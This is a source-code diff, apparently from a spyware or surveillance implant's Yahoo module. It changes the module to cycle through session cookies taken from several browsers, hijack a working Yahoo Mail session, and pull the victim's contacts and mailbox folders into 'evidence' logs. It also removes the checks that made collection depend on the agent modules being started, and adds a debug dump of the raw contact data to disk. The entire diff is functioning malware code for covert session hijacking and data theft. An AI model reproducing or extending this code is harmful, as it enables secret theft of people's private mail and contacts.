@@ -6,6 +6,7 @@
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 #include "Handler_Yahoo.h"
+#include "CookieHandler.h"
 
 
 extern char *base64_encodeY(const unsigned char *input, int length);
@@ -16,7 +17,7 @@ extern BOOL bPM_ContactsStarted;
 extern BOOL bPM_IMStarted;
 
 extern DWORD max_social_mail_len;
-extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
+extern BOOL DumpContact2(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
@@ -232,30 +233,40 @@ BOOL YHParseForParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strBuffer)
 
 
 //get connection parameters to use in next queries
-DWORD YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie)
+DWORD YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, char** strCookie,int& good_cookie_index)
 {
 	LPWSTR	strDomain		= L"mail.yahoo.com";
 	LPSTR	strRecvBuffer	= NULL;
 	LPWSTR	strURI			= NULL;
 	DWORD	dwRet, dwBufferSize;
-
-	//connection to mail server
-	dwRet = HttpSocialRequest(L"mail.yahoo.com", L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME ARRAY
-	znfree((LPVOID*)&strURI);
-	
-	if (dwRet != SOCIAL_REQUEST_SUCCESS)
+	int rightCookieIndex = COOKIE_FROM_IE;
+	for (int i = COOKIE_FROM_IE; i < COOKIE_FROM_NONE_MAX; i++)
 	{
-		znfree((LPVOID*)&strRecvBuffer);
-		return dwRet;
-	}
+		if (!strCookie[i])
+			continue;
+		//connection to mail server
+		dwRet = HttpSocialRequest(L"mail.yahoo.com", L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie[i]); // FIXME ARRAY
+		znfree((LPVOID*)&strURI);
 
-	//extract session parameters from the received buffer
-	if (!YHParseForParams(pYHParams, strRecvBuffer))
-	{
-		znfree((LPVOID*)&strRecvBuffer);
-		YHFreeConnectionParams(pYHParams);
+		if (dwRet != SOCIAL_REQUEST_SUCCESS)
+		{
+			znfree((LPVOID*)&strRecvBuffer);
+			continue;
+		}
+		else{
+			//extract session parameters from the received buffer
+			if (!YHParseForParams(pYHParams, strRecvBuffer))
+			{
+				znfree((LPVOID*)&strRecvBuffer);
+				YHFreeConnectionParams(pYHParams);
 
-		return SOCIAL_REQUEST_BAD_COOKIE;
+				continue;
+			}
+			else{
+				good_cookie_index = i;
+				break;
+			}
+		}
 	}
 
 	znfree((LPVOID*)&strRecvBuffer);
@@ -300,11 +311,13 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 
 	//parse the received buffer
 	jValue = JSON::Parse(strContacts);
+	bool WriteFileOver(char* pBuf, long size, char* fileName);
+	WriteFileOver((char*)strContacts, strlen(strContacts), "response.html");
 
 	if(jValue == NULL)
 		return SOCIAL_REQUEST_BAD_COOKIE;
 
-	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+	hfile = Log_CreateFile2(PM_CONTACTSAGENT,"y_", NULL, 0,0);
 
 	if (jValue != NULL && jValue->IsObject())
 	{
@@ -444,7 +457,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 
 						//save the contact
 						if(bIsContact)
-							DumpContact(hfile, CONTACT_SRC_YAHOO, YHContact.strName, YHContact.strEmail,  YHContact.strCompany, NULL, NULL, NULL, YHContact.strPhone, NULL, YHContact.strName, NULL, dwFlags);
+							DumpContact2(hfile, CONTACT_SRC_YAHOO, YHContact.strName, YHContact.strEmail,  YHContact.strCompany, NULL, NULL, NULL, YHContact.strPhone, NULL, YHContact.strName, NULL, dwFlags);
 
 						//free heap
 						YHFreeContactFields(&YHContact);
@@ -471,7 +484,7 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 
 
 //es: it-mg42.mail.yahoo.com/neo/ws/sd?/v1/user/VC2IYDFHJ3XN57AIDD3DACO5WI/contacts;format=json&view=compact&wssid=omTo4n11SJe&wssid=omTo4n11SJe&ymreqid=88cee993-80ce-5292-0124-c20001010000
-DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
+DWORD YHParseContacts(char* strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 {
 	LPWSTR strURI;
 	LPSTR strRecvBuffer = NULL;
@@ -480,9 +493,11 @@ DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 	strURI = (LPWSTR) zalloc(YAHOO_ALLOC_SIZE * sizeof(WCHAR));
 	if(strURI == NULL)
 		return YAHOO_ALLOC_ERROR;
-
-	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE,  L"/neo/ws/sd?/v1/user/%s/contacts;format=json&view=compact", pYHParams->strNeoGUID);
-	dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
+	//--404--_snwprintf_s(strURI, YAHOO_ALLOC_SIZE,_TRUNCATE,L"/neo/ws/sd?/v1/user/%s/contacts;format=json&view=compact", pYHParams->strNeoGUID);
+	_snwprintf_s(strURI, YAHOO_ALLOC_SIZE, _TRUNCATE, L"/v1/user/%s/contacts;out=guid,nickname,email,yahooid,otherid,phone,jobtitle,company,notes,link,custom,name,address,birthday,anniversary,image;count=500;sort-fields=first;sort=asc?&format=json&view=compact&wssid=%s&custId=ymail&_sc=0 HTTP/1.1"
+		, pYHParams->strNeoGUID, pYHParams->strWSSID);
+	//--404--dwRet = HttpSocialRequest(pYHParams->strServerName, L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
+	dwRet = HttpSocialRequest(L"ws-contacts.mail.yahoo.com", L"GET", strURI, 443, NULL, 0, (BYTE **)&strRecvBuffer, &dwBufferSize, strCookie);
 	znfree((LPVOID*)&strURI);
 
 	if (dwRet != SOCIAL_REQUEST_SUCCESS)
@@ -511,28 +526,30 @@ DWORD YHParseContacts(LPSTR strCookie, LPYAHOO_CONNECTION_PARAMS pYHParams)
 }
 
 
-DWORD YahooContactHandler(LPSTR strCookie)
+DWORD YahooContactHandler(char** strCookie)
 {		
 	YAHOO_CONNECTION_PARAMS YHParams;
-
-	if (!bPM_ContactsStarted)
-		return SOCIAL_REQUEST_SUCCESS;
 
 	SecureZeroMemory(&YHParams, sizeof(YHParams));
 
 	//get connection parameters used in queries
-	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie);
+	int good_cookie_index = COOKIE_FROM_NONE_MAX;
+	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie, good_cookie_index);
 	if (dwRet != SOCIAL_REQUEST_SUCCESS)
 	{
 		YHFreeConnectionParams(&YHParams);
 		return dwRet;
 	}
-
-	//get conctacts list and log evidences
-	dwRet = YHParseContacts(strCookie, &YHParams);
-	if(dwRet != YAHOO_SUCCESS)
-	{
+	if (good_cookie_index == COOKIE_FROM_NONE_MAX || !strCookie[good_cookie_index])
 		dwRet = SOCIAL_REQUEST_BAD_COOKIE;
+	else
+	{
+		//get conctacts list and log evidences
+		dwRet = YHParseContacts(strCookie[good_cookie_index], &YHParams);
+		if(dwRet != YAHOO_SUCCESS)
+		{
+			dwRet = SOCIAL_REQUEST_BAD_COOKIE;
+		}
 	}
 
 	//free connection parameters
@@ -2963,10 +2980,8 @@ DWORD YHFreeConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD YahooMessageHandler(LPSTR strCookie)
+DWORD YahooMessageHandler(char** strCookie)
 {
-	if (!bPM_MailCapStarted)
-		return SOCIAL_REQUEST_SUCCESS;
 
 	//json params
 	std::vector<int>::size_type iItem;
@@ -2987,13 +3002,16 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 	
 	SecureZeroMemory(&YHParams, sizeof(YHParams));
 	
+	int good_cookie_index = COOKIE_FROM_NONE_MAX;
 	//get connection parameters used in later queries
-	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie);
+	DWORD dwRet = YHGetConnectionParams(&YHParams, strCookie, good_cookie_index);
 	if (dwRet != SOCIAL_REQUEST_SUCCESS)
+		return dwRet;
+	if (good_cookie_index == COOKIE_FROM_NONE_MAX || !strCookie[good_cookie_index])
 		return dwRet;
 
 	//get the mail folder names
-	dwRet = YHGetFoldersName(&jValue, &YHParams, strCookie);
+	dwRet = YHGetFoldersName(&jValue, &YHParams, strCookie[good_cookie_index]);
 	if(dwRet != SOCIAL_REQUEST_SUCCESS)
 	{	
 		YHFreeConnectionParams(&YHParams);
@@ -3066,7 +3084,7 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 		}
 
 		//parse mail folder
-		if(YHParseMailBox(strFolderName, strCookie, &YHParams, bIncoming, bDraft) == YAHOO_ALLOC_ERROR)
+		if (YHParseMailBox(strFolderName, strCookie[good_cookie_index], &YHParams, bIncoming, bDraft) == YAHOO_ALLOC_ERROR)
 			iItem = jFolders.size() + 1; //exit from the loop
 
 		//free heap
